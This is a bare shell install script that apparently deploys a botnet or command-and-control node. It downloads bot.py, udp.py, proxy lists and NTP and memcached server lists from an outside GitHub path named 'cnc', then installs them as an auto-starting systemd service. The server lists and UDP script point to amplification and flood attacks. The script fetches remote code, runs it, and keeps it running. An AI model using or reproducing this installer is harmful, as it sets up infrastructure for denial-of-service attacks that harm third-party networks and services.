apt update -y
apt upgrade -y 
apt install python3 -y
apt install python3-pip -y
mkdir bot
cd bot
wget https://raw.githubusercontent.com/zeronxdev/data/main/cnc/src/Server/bot.py
wget https://raw.githubusercontent.com/zeronxdev/data/main/cnc/requirements.txt
wget https://raw.githubusercontent.com/zeronxdev/data/main/cnc/src/Server/ntpServers.txt
wget https://raw.githubusercontent.com/zeronxdev/data/main/cnc/src/Server/memsv.txt
wget https://raw.githubusercontent.com/zeronxdev/data/main/cnc/src/Server/socks4.txt
wget https://raw.githubusercontent.com/zeronxdev/data/main/cnc/src/Server/udp.py
sudo wget -O /etc/systemd/system/bots.service https://raw.githubusercontent.com/zeronxdev/data/main/cnc/bots.service
pip3 install -r requirements.txt
sudo systemctl daemon-reload
sudo systemctl enable bots.service
sudo systemctl start bots.service

